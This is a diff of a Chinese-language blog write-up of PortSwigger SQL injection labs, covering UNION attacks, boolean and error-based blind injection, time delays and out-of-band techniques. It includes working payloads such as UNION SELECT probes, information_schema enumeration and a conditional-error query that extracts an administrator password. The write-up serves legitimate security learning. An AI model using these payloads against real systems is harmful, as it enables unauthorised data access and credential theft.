-<h4 id="解题过程-6"><a href="#解题过程-6" class="headerlink" title="解题过程"></a>解题过程</h4><ul>
+</li>
+<li><p>解题过程</p>
+<ul>
 <li>首先，确定返回的列数：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Pets<span class="string">&#x27; UNION SELECT NULL-- </span></span><br><span class="line"><span class="string">?category=Pets&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--  </span></span><br><span class="line">?category<span class="operator">=</span>Pets<span class="string">&#x27; UNION SELECT NULL,NULL--  </span></span><br><span class="line"><span class="string"># 不成功。。</span></span><br></pre></td></tr></table></figure>
 <!-- ![](LAB7-1-查询返回的列数.png) --></li>
 </ul>
-<h3 id="列出数据库的内容"><a href="#列出数据库的内容" class="headerlink" title="列出数据库的内容"></a>列出数据库的内容</h3><ul>
+</li>
+</ul>
+<h4 id="列出数据库的内容"><a href="#列出数据库的内容" class="headerlink" title="列出数据库的内容"></a>列出数据库的内容</h4><ul>
 <li>大多数数据库类型（Oracle除外），都有一个名为<code>information_schema</code>的系统表，其中包含有关数据库的信息。可以使用这个表来列出数据库中的表和列。</li>
 <li>例：<ul>
 <li>可以查询<code>information_schema.tables</code>表来列出数据库中的表:<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.tables</span><br></pre></td></tr></table></figure></li>
@@ -782,12 +821,16 @@
 </ul>
 </li>
 </ul>
-<h3 id="🧪实验8：SQL注入攻击，列出非Oracle数据库上的数据库内容"><a href="#🧪实验8：SQL注入攻击，列出非Oracle数据库上的数据库内容" class="headerlink" title="🧪实验8：SQL注入攻击，列出非Oracle数据库上的数据库内容"></a>🧪实验8：SQL注入攻击，列出非Oracle数据库上的数据库内容</h3><h4 id="实验说明-7"><a href="#实验说明-7" class="headerlink" title="实验说明"></a>实验说明</h4><ul>
+<h4 id="🧪实验8：SQL注入攻击，列出非Oracle数据库上的数据库内容"><a href="#🧪实验8：SQL注入攻击，列出非Oracle数据库上的数据库内容" class="headerlink" title="🧪实验8：SQL注入攻击，列出非Oracle数据库上的数据库内容"></a>🧪实验8：SQL注入攻击，列出非Oracle数据库上的数据库内容</h4><ul>
+<li><p>实验说明</p>
+<ul>
 <li>本实验在产品类别筛选器中包含一个SQL注入漏洞。查询结果将在应用程序的响应中返回，可以使用UNION攻击从其他表中检索数据。</li>
 <li>应用程序具有登录功能，数据库包含一个保存用户名和密码的表。</li>
 <li>任务：执行SQL注入攻击，确定表的名称和列的名称，查询所有用户的用户名和密码，以<code>administrator</code>的身份登录。</li>
 </ul>
-<h4 id="解题过程-7"><a href="#解题过程-7" class="headerlink" title="解题过程"></a>解题过程</h4><ul>
+</li>
+<li><p>解题过程</p>
+<ul>
 <li>首先确定原始查询返回的列数：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; UNION SELECT NULL,NULL-- </span></span><br><span class="line"><span class="string"># 返回正常结果，所以返回的列数为2</span></span><br></pre></td></tr></table></figure></li>
 <li>然后确定每一列的类型：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; UNION SELECT &#x27;</span>a<span class="string">&#x27;,NULL-- </span></span><br><span class="line"><span class="string">?category=Gifts&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="string">&#x27;a&#x27;</span><span class="comment">-- </span></span><br><span class="line"># 两个都成功，说明两列都是字符串类型</span><br></pre></td></tr></table></figure></li>
 <li>查询数据库中的表：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; UNION SELECT table_name, NULL FROM information_schema.tables--</span></span><br></pre></td></tr></table></figure>
@@ -798,12 +841,16 @@
 <img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB8-3-%E6%9F%A5%E8%AF%A2%E5%88%B0%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81.png"></li>
 <li>使用获得的用户名和密码登录<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB8-4-%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F.png"></li>
 <li>完成实验✅</li>
+<li>查询数据库中的类型：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; UNION SELECT version(),NULL--</span></span><br></pre></td></tr></table></figure>
+<img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB8-5-%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B.png"></li>
 </ul>
-<h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><ul>
+</li>
+</ul>
+<h2 id="SQL盲注入"><a href="#SQL盲注入" class="headerlink" title="SQL盲注入"></a>SQL盲注入</h2><h3 id="什么是SQL盲注？"><a href="#什么是SQL盲注？" class="headerlink" title="什么是SQL盲注？"></a>什么是SQL盲注？</h3><ul>
 <li>当应用程序易受SQL注入攻击，但其HTTP响应不包含相关SQL查询的结果或任何数据库错误的详细信息时，就会发生SQL盲注。</li>
 <li>许多技术（如<code>UNION</code>攻击）对SQL盲注漏洞无效，因为它们依赖于应用程序的响应中包含有关查询结果的信息。但是，可以使用其他技术来利用SQL盲注漏洞。</li>
 </ul>
-<h2 id="通过触发条件响应利用SQL盲注（布尔盲注）"><a href="#通过触发条件响应利用SQL盲注（布尔盲注）" class="headerlink" title="通过触发条件响应利用SQL盲注（布尔盲注）"></a>通过触发条件响应利用SQL盲注（布尔盲注）</h2><ul>
+<h3 id="通过触发条件响应利用SQL盲注（布尔盲注）"><a href="#通过触发条件响应利用SQL盲注（布尔盲注）" class="headerlink" title="通过触发条件响应利用SQL盲注（布尔盲注）"></a>通过触发条件响应利用SQL盲注（布尔盲注）</h3><ul>
 <li><p>考虑一个应用程序，它使用跟踪Cookie来收集有关使用情况的分析。对应用程序的请求包括一个cookie头，如下所示：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</span><br></pre></td></tr></table></figure></li>
 <li><p>当处理包含<code>TrackingId</code>的cookie的请求时，应用程序使用SQL查询来确定这是否是已知用户：</p>
@@ -813,7 +860,7 @@
 <li><p>这种行为足以利用SQL盲注漏洞。可以通过有条件地触发不同的响应来检索信息，具体取决于注入的条件。</p>
 </li>
 <li><p>要确定漏洞是怎么工作的，假设发送了两个请求，cookie值中分别包含以下<code>TrackingId</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">…xyz&#x27; AND &#x27;1&#x27;=&#x27;1</span><br><span class="line">…xyz&#x27; AND &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">…xyz<span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">…xyz<span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span></span><br></pre></td></tr></table></figure></li>
 <li><p>第一个请求将返回数据，因为注入的<code>AND &#39;1&#39;=&#39;1</code>条件为真。</p>
 </li>
 <li><p>第二个请求将不返回数据，因为注入的<code>AND &#39;1&#39;=&#39;2</code>条件为假。</p>
@@ -834,7 +881,7 @@
 <li><p>注意：在Oracle数据库中，<code>SUBSTRING</code>函数被称为<code>SUBSTR</code>。详细可以参考<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a></p>
 </li>
 </ul>
-<h3 id="🧪实验9：带条件响应的SQL盲注"><a href="#🧪实验9：带条件响应的SQL盲注" class="headerlink" title="🧪实验9：带条件响应的SQL盲注"></a>🧪实验9：带条件响应的SQL盲注</h3><ul>
+<h4 id="🧪实验9：带条件响应的SQL盲注"><a href="#🧪实验9：带条件响应的SQL盲注" class="headerlink" title="🧪实验9：带条件响应的SQL盲注"></a>🧪实验9：带条件响应的SQL盲注</h4><ul>
 <li><p>实验说明</p>
 <ul>
 <li>本实验包含一个SQL盲注漏洞。应用程序使用跟踪cookie进行分析，并执行包含提交cookie值的SQL查询。</li>
@@ -855,14 +902,14 @@
 </ul>
 </li>
 </ul>
-<h2 id="基于错误的SQL注入-报错盲注"><a href="#基于错误的SQL注入-报错盲注" class="headerlink" title="基于错误的SQL注入(报错盲注)"></a>基于错误的SQL注入(报错盲注)</h2><ul>
+<h3 id="基于错误的SQL注入-报错盲注"><a href="#基于错误的SQL注入-报错盲注" class="headerlink" title="基于错误的SQL注入(报错盲注)"></a>基于错误的SQL注入(报错盲注)</h3><ul>
 <li>基于错误的SQL注入是指您能够使用错误消息从数据库中提取或推断敏感数据的情况，即使在盲目的上下文中也是如此。可能性取决于数据库的配置和您能够触发的错误类型：<ul>
 <li>您可以根据布尔表达式的结果，引导应用程序返回特定的错误响应。你可以像我们在上一节中看到的条件响应一样利用这一点。有关更多信息，请参见通过触发条件错误利用SQL盲注入。</li>
 <li>您可能能够触发错误消息，输出查询返回的数据。这有效地将原本盲目的SQL注入漏洞变成了可见的漏洞。有关详细信息，请参阅通过详细SQL错误消息提取敏感数据。</li>
 </ul>
 </li>
 </ul>
-<h3 id="通过触发条件错误利用SQL盲目注入"><a href="#通过触发条件错误利用SQL盲目注入" class="headerlink" title="通过触发条件错误利用SQL盲目注入"></a>通过触发条件错误利用SQL盲目注入</h3><ul>
+<h4 id="通过触发条件错误利用SQL盲目注入"><a href="#通过触发条件错误利用SQL盲目注入" class="headerlink" title="通过触发条件错误利用SQL盲目注入"></a>通过触发条件错误利用SQL盲目注入</h4><ul>
 <li>有些应用程序执行SQL查询，但无论查询是否返回任何数据，它们的行为都不会改变。上一节中的技术将不起作用，因为注入不同的布尔条件对应用程序的响应没有影响。</li>
 <li>通常可以根据是否发生SQL错误来引导应用程序返回不同的响应。您可以修改查询，使其仅在条件为true时才导致数据库错误。通常，数据库抛出的未处理错误会导致应用程序的响应出现一些差异，例如错误消息。这使您能够推断注入条件的真实性。</li>
 <li>例如：<ul>
@@ -877,21 +924,20 @@
 </li>
 <li>使用此技术，您可以通过一次测试一个字符来检索数据：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xyz<span class="string">&#x27; AND (SELECT CASE WHEN (Username = &#x27;</span>Administrator<span class="string">&#x27; AND SUBSTRING(Password, 1, 1) &gt; &#x27;</span>m<span class="string">&#x27;) THEN 1/0 ELSE &#x27;</span>a<span class="string">&#x27; END FROM Users)=&#x27;</span>a</span><br></pre></td></tr></table></figure></li>
 </ul>
-<h3 id="🧪实验10：带条件错误的SQL盲注入"><a href="#🧪实验10：带条件错误的SQL盲注入" class="headerlink" title="🧪实验10：带条件错误的SQL盲注入"></a>🧪实验10：带条件错误的SQL盲注入</h3><ul>
+<h4 id="🧪实验10：带条件错误的SQL盲注入"><a href="#🧪实验10：带条件错误的SQL盲注入" class="headerlink" title="🧪实验10：带条件错误的SQL盲注入"></a>🧪实验10：带条件错误的SQL盲注入</h4><ul>
 <li><p>实验说明</p>
 <ul>
 <li>本实验包含一个SQL盲目注入漏洞。应用程序使用跟踪Cookie进行分析，并执行包含提交的Cookie值的SQL查询。</li>
 <li>SQL查询的结果不会返回，应用程序也不会根据查询是否返回任何行而做出任何不同的响应。如果SQL查询导致错误，则应用程序返回自定义错误消息。</li>
 <li>该数据库包含一个名为users的不同表，其中的列名为username和password。您需要利用SQL盲目注入漏洞来找出管理员用户的密码。</li>
 <li>要解决实验，请以<code>administrator</code>的身份登录。</li>
+<li>注意：本实验使用Oracle数据库。有关更多信息，请参阅SQL注入备忘单。</li>
 </ul>
-</li>
-<li><p>注意：本实验使用Oracle数据库。有关更多信息，请参阅SQL注入备忘单。</p>
 </li>
 <li><p>解题过程</p>
 </li>
 </ul>
-<h3 id="通过详细的SQL错误消息提取敏感数据"><a href="#通过详细的SQL错误消息提取敏感数据" class="headerlink" title="通过详细的SQL错误消息提取敏感数据"></a>通过详细的SQL错误消息提取敏感数据</h3><ul>
+<h4 id="通过详细的SQL错误消息提取敏感数据"><a href="#通过详细的SQL错误消息提取敏感数据" class="headerlink" title="通过详细的SQL错误消息提取敏感数据"></a>通过详细的SQL错误消息提取敏感数据</h4><ul>
 <li>数据库的错误配置有时会导致详细的错误消息。这些可能会提供对攻击者有用的信息。例如，考虑以下错误消息，它在将单引号注入id参数后出现：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = &#x27;&#x27;&#x27;. Expected char</span><br></pre></td></tr></table></figure></li>
 <li>这显示了应用程序使用我们的输入构造的完整查询。我们可以看到，在本例中，我们将注入到WHERE语句中的单引号字符串中。这使得构造包含恶意负载的有效查询变得更加容易。注释掉查询的其余部分可以防止多余的单引号破坏语法。</li>
 <li>有时候，您可能会导致应用程序生成一条错误消息，其中包含查询返回的某些数据。这有效地将一个原本是盲目的SQL注入漏洞变成了一个可见的漏洞。</li>
@@ -899,7 +945,7 @@
 <li>通常，你试图读取的数据是一个字符串。尝试将其转换为不兼容的数据类型（如int）可能会导致类似以下的错误：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ERROR: invalid input syntax <span class="keyword">for</span> type <span class="type">integer</span>: &quot;Example data&quot;</span><br></pre></td></tr></table></figure></li>
 <li>如果字符限制阻止您触发条件响应，这种类型的查询也可能很有用。</li>
 </ul>
-<h3 id="🧪实验11：可视的基于错误的SQL注入"><a href="#🧪实验11：可视的基于错误的SQL注入" class="headerlink" title="🧪实验11：可视的基于错误的SQL注入"></a>🧪实验11：可视的基于错误的SQL注入</h3><ul>
+<h4 id="🧪实验11：可视的基于错误的SQL注入"><a href="#🧪实验11：可视的基于错误的SQL注入" class="headerlink" title="🧪实验11：可视的基于错误的SQL注入"></a>🧪实验11：可视的基于错误的SQL注入</h4><ul>
 <li><p>实验说明</p>
 <ul>
 <li>本实验包含SQL注入漏洞。应用程序使用跟踪Cookie进行分析，并执行包含提交的Cookie值的SQL查询。不返回SQL查询的结果。</li>
@@ -909,7 +955,7 @@
 <li><p>解题过程</p>
 </li>
 </ul>
-<h2 id="通过触发时间延迟来利用SQL盲目注入"><a href="#通过触发时间延迟来利用SQL盲目注入" class="headerlink" title="通过触发时间延迟来利用SQL盲目注入"></a>通过触发时间延迟来利用SQL盲目注入</h2><ul>
+<h3 id="通过触发时间延迟来利用SQL盲目注入（延时盲注）"><a href="#通过触发时间延迟来利用SQL盲目注入（延时盲注）" class="headerlink" title="通过触发时间延迟来利用SQL盲目注入（延时盲注）"></a>通过触发时间延迟来利用SQL盲目注入（延时盲注）</h3><ul>
 <li><p>如果应用程序在执行SQL查询时捕获数据库错误并妥善处理它们，则应用程序的响应不会有任何差异。这意味着前面的诱导条件错误的技术将不起作用。</p>
 </li>
 <li><p>在这种情况下，通常可以通过根据注入条件为true还是false触发时间延迟来利用SQL盲注入漏洞。由于SQL查询通常由应用程序同步处理，因此延迟SQL查询的执行也会延迟HTTP响应。这允许您根据接收HTTP响应所花费的时间来确定注入条件的真实性。</p>
@@ -925,11 +971,11 @@
 <li><p>在SQL查询中触发时间延迟的方法有很多种，不同的技术适用于不同类型的数据库。有关详细信息，请参阅SQL注入备忘单。</p>
 </li>
 </ul>
-<h3 id="🧪实验12：带时间延迟的SQL盲注入和信息检索"><a href="#🧪实验12：带时间延迟的SQL盲注入和信息检索" class="headerlink" title="🧪实验12：带时间延迟的SQL盲注入和信息检索"></a>🧪实验12：带时间延迟的SQL盲注入和信息检索</h3><ul>
+<h4 id="🧪实验12：带时间延迟的SQL盲注入和信息检索"><a href="#🧪实验12：带时间延迟的SQL盲注入和信息检索" class="headerlink" title="🧪实验12：带时间延迟的SQL盲注入和信息检索"></a>🧪实验12：带时间延迟的SQL盲注入和信息检索</h4><ul>
 <li>实验说明</li>
 <li>解题过程</li>
 </ul>
-<h2 id="利用带外（OAST）技术进行SQL盲注入"><a href="#利用带外（OAST）技术进行SQL盲注入" class="headerlink" title="利用带外（OAST）技术进行SQL盲注入"></a>利用带外（OAST）技术进行SQL盲注入</h2><ul>
+<h3 id="利用带外（OAST）技术进行SQL盲注入（带外盲注）"><a href="#利用带外（OAST）技术进行SQL盲注入（带外盲注）" class="headerlink" title="利用带外（OAST）技术进行SQL盲注入（带外盲注）"></a>利用带外（OAST）技术进行SQL盲注入（带外盲注）</h3><ul>
 <li><p>应用程序可能执行与上一个示例相同的SQL查询，但异步执行。应用程序继续在原始线程中处理用户的请求，并使用另一个线程使用跟踪cookie执行SQL查询。该查询仍然容易受到SQL注入的攻击，但目前为止所描述的技术都不起作用。应用程序的响应不依赖于查询是否返回任何数据、是否发生数据库错误或执行查询所花费的时间。</p>
 </li>
 <li><p>在这种情况下，通常可以通过触发与您控制的系统的带外网络交互来利用SQL盲注入漏洞。这些可以基于注入的条件来触发，以每次推断一条信息。更有用的是，数据可以直接在网络交互中泄露。</p>
@@ -937,7 +983,7 @@
 <li><p>多种网络协议可用于此目的，但通常最有效的是DNS（域名服务）。许多生产网络允许DNS查询的自由出口，因为它们对于生产系统的正常运行至关重要。</p>
 </li>
 </ul>
-<h3 id="🧪实验13：带外交互的SQL盲注入"><a href="#🧪实验13：带外交互的SQL盲注入" class="headerlink" title="🧪实验13：带外交互的SQL盲注入"></a>🧪实验13：带外交互的SQL盲注入</h3><h3 id="🧪实验14：带外数据渗出的SQL盲注入"><a href="#🧪实验14：带外数据渗出的SQL盲注入" class="headerlink" title="🧪实验14：带外数据渗出的SQL盲注入"></a>🧪实验14：带外数据渗出的SQL盲注入</h3><h2 id="不同上下文中的SQL注入"><a href="#不同上下文中的SQL注入" class="headerlink" title="不同上下文中的SQL注入"></a>不同上下文中的SQL注入</h2><h3 id="通过XML编码绕过过滤器的SQL注入"><a href="#通过XML编码绕过过滤器的SQL注入" class="headerlink" title="通过XML编码绕过过滤器的SQL注入"></a>通过XML编码绕过过滤器的SQL注入</h3><h2 id="二阶SQL注入"><a href="#二阶SQL注入" class="headerlink" title="二阶SQL注入"></a>二阶SQL注入</h2><ul>
+<h4 id="🧪实验13：带外交互的SQL盲注入"><a href="#🧪实验13：带外交互的SQL盲注入" class="headerlink" title="🧪实验13：带外交互的SQL盲注入"></a>🧪实验13：带外交互的SQL盲注入</h4><h4 id="🧪实验14：带外数据渗出的SQL盲注入"><a href="#🧪实验14：带外数据渗出的SQL盲注入" class="headerlink" title="🧪实验14：带外数据渗出的SQL盲注入"></a>🧪实验14：带外数据渗出的SQL盲注入</h4><h2 id="不同上下文中的SQL注入"><a href="#不同上下文中的SQL注入" class="headerlink" title="不同上下文中的SQL注入"></a>不同上下文中的SQL注入</h2><h3 id="通过XML编码绕过过滤器的SQL注入"><a href="#通过XML编码绕过过滤器的SQL注入" class="headerlink" title="通过XML编码绕过过滤器的SQL注入"></a>通过XML编码绕过过滤器的SQL注入</h3><h2 id="二阶SQL注入"><a href="#二阶SQL注入" class="headerlink" title="二阶SQL注入"></a>二阶SQL注入</h2><ul>
 <li>当应用程序处理来自HTTP请求的用户输入并以不安全的方式将输入合并到SQL查询中时，就会发生一阶SQL注入。</li>
 <li>当应用程序从HTTP请求中获取用户输入并将其存储以备将来使用时，就会发生二阶SQL注入。这通常是通过将输入放入数据库来完成的，但在存储数据的位置不会出现漏洞。稍后，当处理不同的HTTP请求时，应用程序检索存储的数据，并以不安全的方式将其合并到SQL查询中。因此，二阶SQL注入也被称为存储SQL注入。</li>
 <li>二阶SQL注入通常发生在开发人员意识到SQL注入漏洞的情况下，因此可以安全地处理输入到数据库中的初始位置。当数据稍后被处理时，它被认为是安全的，因为它以前被安全地放置在数据库中。在这一点上，数据是以一种不安全的方式处理的，因为开发人员错误地认为它是可信的。</li>
@@ -959,6 +1005,7 @@
 <li><a href="https://mp.weixin.qq.com/s/RTFrPLDiycU0nwZp4baiKQ">一篇文章学会手工注入（万字介绍SQL注入）</a></li>
 <li><a href="https://blog.csdn.net/weixin_52796034/article/details/133746733">渗透测试—手把手教你SQL注入(4)–DNSLOG外带注入</a></li>
 <li><a href="https://blog.csdn.net/kongzhian/article/details/110001836">SQL注入——二次注入的原理 利用以及防御</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/473336511">Burp Collaborator-带外技术工具 - 知乎</a></li>
 </ul>
 ]]></content>
       <categories>
